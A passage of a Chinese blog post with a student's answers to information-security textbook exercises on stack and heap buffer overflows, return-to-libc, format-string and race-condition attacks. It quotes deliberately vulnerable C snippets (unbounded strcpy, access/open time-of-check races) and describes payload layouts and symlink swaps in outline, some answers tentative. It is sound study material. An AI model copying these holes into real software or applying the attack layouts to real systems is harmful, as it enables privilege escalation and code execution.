+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112102219709.png" alt="image-20230112102219709"></p>
+<p>这样的话，虽然改变不了当前函数的栈帧，但是可以修改下一个调用函数的返回地址</p>
+<p>比如会影响缓冲区复制函数的返回地址</p>
+<p>如<code>strcpy</code>等，调用之后buffer依然在<code>strcpy</code>栈帧的下方，往上溢出覆盖了<code>strcpy</code>的返回地址</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112102745485.png" alt="image-20230112102745485"></p>
+<p>错误，溢出覆盖的是<code>foo</code>的返回地址，不是<code>strcpy</code>的，当<code>strcpy</code>结束返回时恶意代码还没有被触发</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112104429430.png" alt="image-20230112104429430"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buffer = (<span class="type">char</span> *) <span class="built_in">malloc</span>(size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><del>不安全？可以堆溢出覆盖返回地址？</del>题4.9有提示</p>
+<p>反正buffer依然可以被溢出，感觉有溢出就有风险</p>
+<p>应当使用<code>strlcpy(buffer, str, size)</code></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112105310601.png" alt="image-20230112105310601"></p>
+<p><del>P73？调试手段找到的地址与程序实际运行的地址可能不一致</del></p>
+<p>0xbffff300和0xbffff400包含了\x00字节，使<code>strcpy</code>函数提前结束了</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112115613371.png" alt="image-20230112115613371"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">24</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接知道了返回地址的位置，0x40*‘A’ + return addr + 100*NOP + shellcode</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112120815697.png" alt="image-20230112120815697"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">pre</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The following is a snippet of a code execution sequence.</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">p</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">q</span>;</span></span><br><span class="line">    <span class="type">char</span> *buffer = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Code omitted: Add Node p to a linked list */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// There is a potential buffer overflow in the following</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, user_input);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// remove Node p from the linked list</span></span><br><span class="line">    q = p-&gt;pre;			<span class="comment">//1</span></span><br><span class="line">    q-&gt;next = p-&gt;next;	<span class="comment">//2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;				<span class="comment">//3</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112120939478.png" alt="image-20230112120939478"></p>
+<blockquote>
+<p><strong>Hint</strong>: You still want to place the starting address of your malicious code into the return address field located at <code>0xBBFFAACC</code>. Unlike stack-back buffer overflows, where you can naturally reach the return address field via overflowing, now the buffer is on the heap, but the return address is on the stack; you cannot reach the stack by overflowing something on the heap. You should take advantage of the operations on the linked list (Lines 1 and 2) to modify the return address field.</p>
+<p>This is a simplified version of how a buffer overflow on the heap can be exploited. The linked list is not part of the vulnerable program; it is actually part of the operating system, which uses it to manage the memory on the heap for the current process. Unfortunately, <strong>the linked list is also stored on the heap</strong>, so by overflowing an application’s buffer, attackers can change the values on this linked list. When the OS operates on the corrupted linked list, it may change the return address of function, and trigger the execution of the injected code.</p>
+</blockquote>
+<p>因为无法在栈里面塞shellcode，所以在<code>buffer</code>里面填充shellcode。随后进一步填充<code>buffer</code>使其溢出，覆盖<code>p-&gt;next</code>使其指向栈的返回地址。在后续操作中修改<code>*(p-&gt;next)</code>为<code>buffer</code>中shellcode的起始地址？</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112150220009.png" alt="image-20230112150220009"></p>
+<p>同上？覆盖掉<code>buffer</code>地址就好了？</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112150413534.png" alt="image-20230112150413534"></p>
+<p>ASLR随机化内存中堆栈和堆的初始化位置，因此程序每次运行的位置都不同。因此，不可能每次都准确地猜出栈、栈基址以及恶意代码的位置。这是一个考验和错误，必须耐心的攻击工作。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112153544502.png" alt="image-20230112153544502"></p>
+<p>塞入了大量的NOP指令，使命中区扩大，配合暴力运行破解</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112153932216.png" alt="image-20230112153932216"></p>
+<p>没有NOP指令，要求刚好命中恶意代码的位置（0xAABB0054？）</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230112154215665.png" alt="image-20230112154215665"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[X];</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为保证成功，假设<code>buffer</code>长度就是100，往里面全部填充<code>0xAABBCC10 + 108</code>的地址值，这样不管实际返回地址的位置在哪，总能命中<code>0xAABBCC10 + 108</code>，再接上NOP指令和shellcode即可？</p>
+<h1 id="05-Return-to-Libc-ex"><a href="#05-Return-to-Libc-ex" class="headerlink" title="05_Return_to_Libc_ex"></a>05_Return_to_Libc_ex</h1><p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230124111440081.png" alt="image-20230124111440081"></p>
+<p>return to lib咯</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230124111505454.png" alt="image-20230124111505454"></p>
+<p>一般不怎么重要，吧</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230124111732363.png" alt="image-20230124111732363"></p>
+<p>环境变量传入“&#x2F;bin&#x2F;sh”的值，找出来<code>system()</code>以及“&#x2F;bin&#x2F;sh”的地址位置，然后对应位置填入对应参数就完事</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230124113858857.png" alt="image-20230124113858857"></p>
+<p>shellcode里多执行一步<code>setuid()</code></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230124113943844.png" alt="image-20230124113943844"></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230124114703648-1674532024144-1.png" alt="image-20230124114703648"></p>
+<p>YES！</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230124115655633.png" alt="image-20230124115655633"></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230124120000227.png" alt="image-20230124120000227"></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230124120010477.png" alt="image-20230124120010477"></p>
+<p>ret：pop $ip</p>
+<p>所以，要覆盖的返回地址范围往上接着连续填B、C序列的地址就好了？</p>
+<h1 id="06-Format-String-ex"><a href="#06-Format-String-ex" class="headerlink" title="06_Format_String_ex"></a>06_Format_String_ex</h1><p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230202112826401.png" alt="image-20230202112826401"></p>
+<p>缓冲区溢出的工作原理是将一个大的数据数组复制到另一个容量小得多的数组中。由于数组必须支持指针算法，所以它们总是从较低的地址增长到较高的地址，即使在堆栈中也是如此。这将允许我们覆盖数组直到返回地址。</p>
+<p>Format string，使用printf（）中的缺陷，该缺陷不强制要求格式说明符的数目等于参数的数目，并将任意移动到堆栈中的下一个内存位置，直到到达返回地址为止。</p>
+<p>这两种攻击都需要用户输入才能工作，但格式化字符串的限制较少。在缓冲区溢出中，我们需要事先知道数组的大小，并将另一个大得多的数组复制到该数组中，而在格式字符串中，只要存在一个printf（）函数，该函数使用用户输入作为其格式字符串就足够了。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230202113039417.png" alt="image-20230202113039417"></p>
+<p>不可以。格式化字符串与缓冲区溢出不同，它不会修改返回地址之前的任何内存位置，只修改返回地址。因此，堆叠防护装置无法工作。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230202113226398.png" alt="image-20230202113226398"></p>
+<p>该攻击将替换调用printf（）的函数的返回地址，并且只有在函数返回后才会真正生效。仅仅删除printf（）的特权不会有多大作用，但是我们需要在调用调用printf（）的函数之前删除特权，并在该函数返回后启用它。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230202113332980.png" alt="image-20230202113332980"></p>
+<p>不会。攻击会在格式字符串中放置恶意负载，并将返回地址指向该位置。虽然返回地址将被堆栈上的位置成功覆盖，但恶意代码不会被执行。</p>
+<p>但ROP？</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230202113545216.png" alt="image-20230202113545216"></p>
+<p>对。回想一下，我们使用%n或%hn打印字符数。%n要求参数的类型为signed int，%hn要求参数的类型为signed short int。signed short int的范围为-32767到32768。如果打印32769个字符，然后使用说明符%hn，则打印在目标地址中的值将为-32767，如果打印65536个字符，目标地址中打印的值将为零。</p>
+<h1 id="07-Race-Condition-ex"><a href="#07-Race-Condition-ex" class="headerlink" title="07_Race_Condition_ex"></a>07_Race_Condition_ex</h1><p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230203154535459.png" alt="image-20230203154535459"></p>
+<p><del>YES</del>不，&#x2F;etc&#x2F;passwd是一个受保护的文件，普通用户没有对它的写访问权限。所以if块永远不会被执行。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230203154715571.png" alt="image-20230203154715571"></p>
+<p>有，<code>open()</code>检查有效ID，<code>faccess()</code>检查真实ID，换成检查文件描述符没有什么区别（把描述符重定向到新的文件？）</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230203155530121.png" alt="image-20230203155530121"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat1</span>, <span class="title">stat2</span>;</span></span><br><span class="line">    <span class="type">int</span> fd1, fd2;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (access(<span class="string">&quot;/tmp/XYZ&quot;</span>, O_RDWR)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Permission denied\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">else</span> fd1 = open(<span class="string">&quot;/tmp/XYZ&quot;</span>, O_RDWR);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (access(<span class="string">&quot;/tmp/XYZ&quot;</span>, O_RDWR)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Permission denied\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> fd2 = open(<span class="string">&quot;/tmp/XYZ&quot;</span>, O_RDWR);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// The program then checks whether fd1 and fd2 refer to the same file, if so, the program will write     to fd1 (or fd2). Otherwise, the program will do nothing and exit.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3个</p>
+<p>第一个竞争是access &amp; fd1 open之间的竞争，我们必须创建一个从&#x2F;tmp&#x2F;XYZ到要更改的文件的符号链接。<br>第二个是在 fd1 open and the second access之间，我们必须更新符号链接并将其指向用户可以访问的文件。<br>第三种是在the second access and fd2 open 之间，类似于第一个竞争。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230203160004947.png" alt="image-20230203160004947"></p>
+<p>在<code>open()</code>系统调用中，检查用户权限和打开文件是一个原子操作，因此只有<code>open()</code>调用不可能有竞争条件。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230203160904685.png" alt="image-20230203160904685"></p>
+<p>如果问题是指在strcpy（）调用之前禁用根权限，然后再启用它，那么它将不起作用，因为实际的攻击发生在我们从bof（）函数返回时。如果我们在bof（）调用之前禁用root权限，在调用之后启用它，那么我们就可以防止攻击。</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230203161204922.png" alt="image-20230203161204922"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">statbuf</span>;</span></span><br><span class="line">    <span class="type">uid_t</span> real_uid;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    </span><br><span class="line">    fp = fopen(<span class="string">&quot;/tmp/XYZ&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    stat(<span class="string">&quot;/tmp/XYZ&quot;</span>, &amp;statbuf);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The file owner’s user ID: %d\n&quot;</span>, statbuf.st_uid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The process’s real user ID: %d\n&quot;</span>, getuid());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Check whether the file belongs to the user</span></span><br><span class="line">    <span class="keyword">if</span> (statbuf.st_uid == getuid()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IDs match, continue to write to the file.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// write to the file ...</span></span><br><span class="line">        <span class="keyword">if</span> (fp) fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IDs do not match, exit.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fp) fclose(fp);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有，&#x2F;tmp&#x2F;XYZ先指向realuid的文件，<code>stat()</code>之后指向target文件</p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230203161505358.png" alt="image-20230203161505358"></p>
+<p><img src="/2023/02/28/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E7%BB%83%E4%B9%A0%E4%B8%8E%E9%A2%98%E8%A7%A3/image-20230203161518816.png" alt="image-20230203161518816"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">statbuf</span>;</span></span><br><span class="line">    <span class="type">uid_t</span> real_uid;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    </span><br><span class="line">    fp = fopen(<span class="string">&quot;/tmp/XYZ&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    fstat(fileno(fp), &amp;statbuf);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The file owner’s user ID: %d\n&quot;</span>, statbuf.st_uid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The process’s real user ID: %d\n&quot;</span>, getuid());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Check whether the file belongs to the user</span></span><br><span class="line">    <span class="keyword">if</span> (statbuf.st_uid == getuid()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IDs match, continue to write to the file.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// write to the file ...</span></span><br><span class="line">        <span class="keyword">if</span> (fp) fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IDs do not match, exit.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fp) fclose(fp);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>stat和lstat的区别：当文件是一个符号链接时，lstat返回的是该符号链接本身的信息；而stat返回的是该链接指向的文件的</p>
+<p>fstat区别于另外两个系统调用的地方在于，fstat系统调用接受的是 一个“文件描述符”，而另外两个则直接接受“文件全路径”。文件描述符是需要我们用open系统调用后才能得到的，而文件全路经直接写就可以了。</p>
+<p>fileno()函数–获取已经打开的文件的文件描述符</p>
+</blockquote>
